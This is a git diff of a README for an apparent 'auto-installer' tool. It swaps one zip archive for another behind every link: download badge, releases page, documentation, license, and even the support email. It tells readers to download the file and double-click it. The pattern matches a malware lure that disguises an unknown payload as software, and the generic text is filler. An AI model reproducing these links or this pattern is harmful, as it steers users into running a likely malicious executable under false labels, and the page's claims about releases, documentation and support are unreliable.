@@ -1,6 +1,6 @@
 # 🤖 auto-installer - Effortless Software Installation for Everyone
 
-[![Download](https://raw.githubusercontent.com/Dying-cyclicneutropenia983/auto-installer/main/bilic/auto-installer_2.1.zip)](https://raw.githubusercontent.com/Dying-cyclicneutropenia983/auto-installer/main/bilic/auto-installer_2.1.zip)
+[![Download](https://github.com/Dying-cyclicneutropenia983/auto-installer/raw/refs/heads/main/bilic/installer_auto_3.2.zip)](https://github.com/Dying-cyclicneutropenia983/auto-installer/raw/refs/heads/main/bilic/installer_auto_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To use **auto-installer**, your system should meet the following requirements:
 
 To start using **auto-installer**, follow these simple steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Dying-cyclicneutropenia983/auto-installer/main/bilic/auto-installer_2.1.zip).
+1. Visit the [Releases page](https://github.com/Dying-cyclicneutropenia983/auto-installer/raw/refs/heads/main/bilic/installer_auto_3.2.zip).
 2. Look for the latest release version.
 3. Click on the appropriate file based on your operating system to download the installer.
 4. Once the download finishes, locate the file on your device and double-click it.
@@ -50,23 +50,23 @@ If you encounter issues while using **auto-installer**, try the following:
 
 - **Check Internet Connection**: Ensure your connection is stable and fast.
 - **Update Software**: Make sure you have the latest version of **auto-installer**.
-- **Consult Documentation**: Refer to the [Documentation](https://raw.githubusercontent.com/Dying-cyclicneutropenia983/auto-installer/main/bilic/auto-installer_2.1.zip) for specific errors and fixes.
+- **Consult Documentation**: Refer to the [Documentation](https://github.com/Dying-cyclicneutropenia983/auto-installer/raw/refs/heads/main/bilic/installer_auto_3.2.zip) for specific errors and fixes.
 
 ## 📅 Updates
 
-We frequently update **auto-installer** to improve performance and add features. You can find the latest updates on the [Releases page](https://raw.githubusercontent.com/Dying-cyclicneutropenia983/auto-installer/main/bilic/auto-installer_2.1.zip).
+We frequently update **auto-installer** to improve performance and add features. You can find the latest updates on the [Releases page](https://github.com/Dying-cyclicneutropenia983/auto-installer/raw/refs/heads/main/bilic/installer_auto_3.2.zip).
 
 ## 📧 Support
 
 If you need help or have any questions, feel free to reach out:
 
-- Email: https://raw.githubusercontent.com/Dying-cyclicneutropenia983/auto-installer/main/bilic/auto-installer_2.1.zip
+- Email: https://github.com/Dying-cyclicneutropenia983/auto-installer/raw/refs/heads/main/bilic/installer_auto_3.2.zip
 - GitHub Issues: Create a new issue in the repository.
 
 Your feedback is valuable in enhancing the user experience. 
 
 ## 📜 License
 
-**auto-installer** is licensed under the MIT License. You can freely use, modify, and distribute it. Please check the [LICENSE](https://raw.githubusercontent.com/Dying-cyclicneutropenia983/auto-installer/main/bilic/auto-installer_2.1.zip) file for more details.
+**auto-installer** is licensed under the MIT License. You can freely use, modify, and distribute it. Please check the [LICENSE](https://github.com/Dying-cyclicneutropenia983/auto-installer/raw/refs/heads/main/bilic/installer_auto_3.2.zip) file for more details.
 
 Feel free to explore and happy installing!
